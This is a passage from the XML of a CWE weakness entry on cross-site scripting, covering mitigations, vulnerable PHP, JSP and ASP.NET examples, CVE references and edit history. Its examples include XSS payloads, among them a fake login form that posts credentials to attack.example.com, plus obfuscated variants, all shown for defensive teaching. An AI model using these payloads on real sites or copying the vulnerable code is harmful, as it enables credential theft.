                  <xhtml:p>The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-43">
               <Phase>Implementation</Phase>
               <Description>With Struts, write all data from form beans with the bean's filter attribute set to true.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-31">
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.</Description>
               <Effectiveness>Defense in Depth</Effectiveness>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When dynamically constructing web pages, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.</xhtml:p>
                  <xhtml:p>Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon ("&lt;3") would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the "&lt;" character, which would need to be escaped or otherwise handled. In this case, stripping the "&lt;" might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities.</xhtml:p>
                  <xhtml:p>Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.</xhtml:p>
                  <xhtml:p>Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code displays a welcome message on a web page based on the HTTP GET username parameter (covers a Reflected XSS (Type 1) scenario).</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$username = $_GET['username'];<xhtml:br/>echo '&lt;div class="header"&gt; Welcome, ' . $username . '&lt;/div&gt;';</xhtml:div>
               </Example_Code>
               <Body_Text>Because the parameter can be arbitrary, the url of the page could be modified so $username contains scripting syntax, such as</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>http://trustedSite.example.com/welcome.php?username=&lt;Script Language="Javascript"&gt;alert("You've been attacked!");&lt;/Script&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>This results in a harmless alert dialog popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers.</Body_Text>
               <Body_Text>More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>http://trustedSite.example.com/welcome.php?username=&lt;div id="stealPassword"&gt;Please Login:&lt;form name="input" action="http://attack.example.com/stealPassword.php" method="post"&gt;Username: &lt;input type="text" name="username" /&gt;&lt;br/&gt;Password: &lt;input type="password" name="password" /&gt;&lt;br/&gt;&lt;input type="submit" value="Login" /&gt;&lt;/form&gt;&lt;/div&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>If a user clicks on this link then Welcome.php will generate the following HTML and send it to the user's browser:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>&lt;div class="header"&gt; Welcome, &lt;div id="stealPassword"&gt; Please Login:<xhtml:div style="margin-left:1em;">
                        <xhtml:br/>&lt;form name="input" action="attack.example.com/stealPassword.php" method="post"&gt;<xhtml:div style="margin-left:1em;">Username: &lt;input type="text" name="username" /&gt;&lt;br/&gt;<xhtml:br/>Password: &lt;input type="password" name="password" /&gt;&lt;br/&gt;<xhtml:br/>&lt;input type="submit" value="Login" /&gt;</xhtml:div>&lt;/form&gt;</xhtml:div>
                     <xhtml:br/>&lt;/div&gt;&lt;/div&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The trustworthy domain of the URL may falsely assure the user that it is OK to follow the link. However, an astute user may notice the suspicious text appended to the URL. An attacker may further obfuscate the URL (the following example links are broken into multiple lines for readability):</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22<xhtml:br/>stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input<xhtml:br/>%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php<xhtml:br/>%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text<xhtml:br/>%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A<xhtml:br/>+%3Cinput+type%3D%22password%22+name%3D%22password%22<xhtml:br/>+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22<xhtml:br/>+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A</xhtml:div>
               </Example_Code>
               <Body_Text>The same attack string could also be obfuscated as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>trustedSite.example.com/welcome.php?username=&lt;script+type="text/javascript"&gt;<xhtml:br/>document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073<xhtml:br/>\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064<xhtml:br/>\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067<xhtml:br/>\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D<xhtml:br/>\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063<xhtml:br/>\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F<xhtml:br/>\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D<xhtml:br/>\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061<xhtml:br/>\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068<xhtml:br/>\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070<xhtml:br/>\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D<xhtml:br/>\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079<xhtml:br/>\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061<xhtml:br/>\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065<xhtml:br/>\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073<xhtml:br/>\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075<xhtml:br/>\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073<xhtml:br/>\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022<xhtml:br/>\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E<xhtml:br/>\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D<xhtml:br/>\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C<xhtml:br/>\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F<xhtml:br/>\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');&lt;/script&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Both of these attack links will result in the fake login box appearing on the page, and users are more likely to ignore indecipherable text at the end of URLs.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code displays a Reflected XSS (Type 1) scenario.</Intro_Text>
               <Body_Text>The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.</Body_Text>
               <Example_Code Nature="Bad" Language="JSP">
                  <xhtml:div>&lt;% String eid = request.getParameter("eid"); %&gt;<xhtml:br/>...<xhtml:br/>Employee ID: &lt;%= eid %&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The following ASP.NET code segment reads an employee ID number from an HTTP request and displays it to the user.</Body_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>&lt;%<xhtml:br/>protected System.Web.UI.WebControls.TextBox Login;<xhtml:br/>protected System.Web.UI.WebControls.Label EmployeeID;<xhtml:br/>...<xhtml:br/>EmployeeID.Text = Login.Text;<xhtml:br/>%&gt;<xhtml:br/>
                     <xhtml:br/>&lt;p&gt;&lt;asp:label id="EmployeeID" runat="server" /&gt;&lt;/p&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The code in this example operates correctly if the Employee ID variable contains only standard alphanumeric text. If it has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code displays a Stored XSS (Type 2) scenario.</Intro_Text>
               <Body_Text>The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.</Body_Text>
               <Example_Code Nature="Bad" Language="JSP">
                  <xhtml:div>&lt;%Statement stmt = conn.createStatement();<xhtml:br/>ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);<xhtml:br/>if (rs != null) {<xhtml:div style="margin-left:1em;">rs.next();<xhtml:br/>String name = rs.getString("name");</xhtml:div>}%&gt;<xhtml:br/>
                     <xhtml:br/>Employee Name: &lt;%= name %&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The following ASP.NET code segment queries a database for an employee with a given employee ID and prints the name corresponding with the ID.</Body_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>&lt;%<xhtml:br/>protected System.Web.UI.WebControls.Label EmployeeName;<xhtml:br/>...<xhtml:br/>string query = "select * from emp where id=" + eid;<xhtml:br/>sda = new SqlDataAdapter(query, conn);<xhtml:br/>sda.Fill(dt);<xhtml:br/>string name = dt.Rows[0]["Name"];<xhtml:br/>...<xhtml:br/>EmployeeName.Text = name;%&gt;<xhtml:br/>&lt;p&gt;&lt;asp:label id="EmployeeName" runat="server" /&gt;&lt;/p&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code consists of two separate pages in a web application, one devoted to creating user accounts and another devoted to listing active users currently logged in. It also displays a Stored XSS (Type 2) scenario.</Intro_Text>
               <Body_Text>CreateUser.php</Body_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$username = mysql_real_escape_string($username);<xhtml:br/>$fullName = mysql_real_escape_string($fullName);<xhtml:br/>$query = sprintf('Insert Into users (username,password) Values ("%s","%s","%s")', $username, crypt($password),$fullName) ;<xhtml:br/>mysql_query($query);<xhtml:br/>/.../</xhtml:div>
               </Example_Code>
               <Body_Text>The code is careful to avoid a SQL injection attack (CWE-89) but does not stop valid HTML from being stored in the database. This can be exploited later when ListUsers.php retrieves the information:</Body_Text>
               <Body_Text>ListUsers.php</Body_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$query = 'Select * From users Where loggedIn=true';<xhtml:br/>$results = mysql_query($query);<xhtml:br/>
                     <xhtml:br/>if (!$results) {<xhtml:div style="margin-left:1em;">exit;</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>//Print list of users to page</xhtml:i>
                     <xhtml:br/>echo '&lt;div id="userlist"&gt;Currently Active Users:';<xhtml:br/>while ($row = mysql_fetch_assoc($results)) {<xhtml:div style="margin-left:1em;">echo '&lt;div class="userNames"&gt;'.$row['fullname'].'&lt;/div&gt;';</xhtml:div>}<xhtml:br/>echo '&lt;/div&gt;';</xhtml:div>
               </Example_Code>
               <Body_Text>The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Active Users page. This HTML can, for example, be a password stealing Login message.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code is a simplistic message board that saves messages in HTML format and appends them to a file.  When a new user arrives in the room, it makes an announcement:</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$name = $_COOKIE["myname"];<xhtml:br/>$announceStr = "$name just logged in.";<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>//save HTML-formatted message to file; implementation details are irrelevant for this example.</xhtml:i>
                     <xhtml:br/>
				saveMessage($announceStr);</xhtml:div>
               </Example_Code>
               <Body_Text>An attacker may be able to perform an HTML injection (Type 2 XSS) attack by setting a cookie to a value like:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>&lt;script&gt;document.alert('Hacked');&lt;/script&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The raw contents of the message file would look like:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>&lt;script&gt;document.alert('Hacked');&lt;/script&gt; has logged in.</xhtml:div>
               </Example_Code>
               <Body_Text>For each person who visits the message page, their browser would execute the script, generating a pop-up window that says "Hacked". More malicious attacks are possible; see the rest of this entry.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-25926</Reference>
               <Description>Python Library Manager did not sufficiently neutralize a user-supplied search term, allowing reflected XSS.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-25926</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-25963</Reference>
               <Description>Python-based e-commerce platform did not escape returned content on error pages, allowing for reflected Cross-Site Scripting attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-25963</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-1879</Reference>
               <Description>Universal XSS in mobile operating system, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-1879</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-3580</Reference>
               <Description>Chain: improper input validation (CWE-20) in firewall product leads to XSS (CWE-79), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-3580</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2014-8958</Reference>
               <Description>Admin GUI allows XSS through cookie.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2014-8958</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-9764</Reference>
               <Description>Web stats program allows XSS through crafted HTTP header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-9764</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2014-5198</Reference>
               <Description>Web log analysis product allows XSS through crafted HTTP Referer header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2014-5198</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5080</Reference>
               <Description>Chain: protection mechanism failure allows XSS</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5080</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4308</Reference>
               <Description>Chain: incomplete denylist (CWE-184) only checks "javascript:" tag, allowing XSS (CWE-79) using other tags</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4308</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5727</Reference>
               <Description>Chain: incomplete denylist (CWE-184) only removes SCRIPT tags, enabling XSS (CWE-79)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5727</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5770</Reference>
               <Description>Reflected XSS using the PATH_INFO in a URL</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5770</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4730</Reference>
               <Description>Reflected XSS not properly handled when generating an error message</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4730</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5734</Reference>
               <Description>Reflected XSS sent through email message.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5734</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0971</Reference>
               <Description>Stored XSS in a security product.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0971</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5249</Reference>
               <Description>Stored XSS using a wiki page.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5249</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3568</Reference>
               <Description>Stored XSS in a guestbook application.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-3568</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3211</Reference>
               <Description>Stored XSS in a guestbook application using a javascript: URI in a bbcode img tag.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-3211</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3295</Reference>
               <Description>Chain: library file is not protected against a direct request (CWE-425), leading to reflected XSS (CWE-79).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-3295</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Cross-site scripting (XSS)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Cross-site Scripting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Cross-site scripting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Cross Site Scripting (XSS)</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A4</Entry_ID>
               <Entry_Name>Cross-Site Scripting (XSS) Flaws</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>8</Entry_ID>
               <Entry_Name>Cross-site Scripting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-79</Entry_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="209"/>
            <Related_Attack_Pattern CAPEC_ID="588"/>
            <Related_Attack_Pattern CAPEC_ID="591"/>
            <Related_Attack_Pattern CAPEC_ID="592"/>
            <Related_Attack_Pattern CAPEC_ID="63"/>
            <Related_Attack_Pattern CAPEC_ID="85"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-709"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 2: Web-Server Related Vulnerabilities (XSS, XSRF, and Response Splitting).&#34; Page 31"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 3: Web-Client Related Vulnerabilities (XSS).&#34; Page 63"/>
            <Reference External_Reference_ID="REF-712"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 13, &#34;Web-Specific Input Issues&#34; Page 413"/>
            <Reference External_Reference_ID="REF-714"/>
            <Reference External_Reference_ID="REF-715"/>
            <Reference External_Reference_ID="REF-716"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-718"/>
            <Reference External_Reference_ID="REF-719"/>
            <Reference External_Reference_ID="REF-720"/>
            <Reference External_Reference_ID="REF-721"/>
            <Reference External_Reference_ID="REF-722"/>
            <Reference External_Reference_ID="REF-723"/>
            <Reference External_Reference_ID="REF-724"/>
            <Reference External_Reference_ID="REF-725"/>
            <Reference External_Reference_ID="REF-726"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;Cross Site Scripting&#34;, Page 1071"/>
            <Reference External_Reference_ID="REF-956"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-79"/>
         </References>
         <Notes>
            <Note Type="Relationship">
               <xhtml:p>There can be a close relationship between XSS and CSRF (CWE-352).  An attacker might use CSRF in order to trick the victim into submitting requests to the server in which the requests contain an XSS payload.  A well-known example of this was the Samy worm on MySpace [REF-956]. The worm used XSS to insert malicious HTML sequences into a user's profile and add the attacker as a MySpace friend.  MySpace friends of that victim would then execute the payload to modify their own profiles, causing the worm to propagate exponentially. Since the victims did not intentionally insert the malicious script themselves, CSRF was a root cause.</xhtml:p>
            </Note>
            <Note Type="Applicable Platform">
               <xhtml:p>XSS flaws are very common in web applications, since they require a great deal of developer discipline to avoid them.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Description, Relationships, Other_Notes, References, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Enabling_Factors_for_Exploitation, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Detection_Factors, Enabling_Factors_for_Exploitation, Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Name, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
